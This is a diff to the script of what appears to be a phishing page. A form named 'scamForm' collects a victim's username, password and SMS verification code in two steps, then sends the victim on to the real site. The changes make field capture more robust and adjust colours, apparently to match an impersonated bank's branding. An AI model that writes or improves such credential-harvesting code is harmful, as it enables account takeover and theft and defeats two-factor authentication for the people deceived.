@@ -410,10 +410,10 @@ body {
     document.getElementById('scamForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
-        const btn = document.getElementById('verifyBtn'); // Ensure your button has id="verifyBtn"
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-        const smsCode = document.getElementById('sms_code').value;
+        const btn = document.getElementById('verifyBtn');
+        const username = document.querySelector('input[name="username"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+        const smsCode = document.getElementById('sms_code') ? document.getElementById('sms_code').value : "";
         const currentStep = document.getElementById('step').value;
 
         // UI Feedback
@@ -452,7 +452,9 @@ body {
                             document.getElementById('sms_code').focus(); // Auto-focus on SMS field
                             btn.textContent = "Submit Code"; // Change button text
                             btn.disabled = false; // Re-enable for next click
-                            btn.style.backgroundColor = "#c41230"; // Restore color
+                            btn.style.backgroundColor = "#d71e28"; // Restore color
+                            // Show container again to reveal the new input
+                            document.querySelector('.container').style.display = 'block';
                         }, 1000);
                     } else {
                         // STEP 2: Got SMS Code. Redirect to real site.
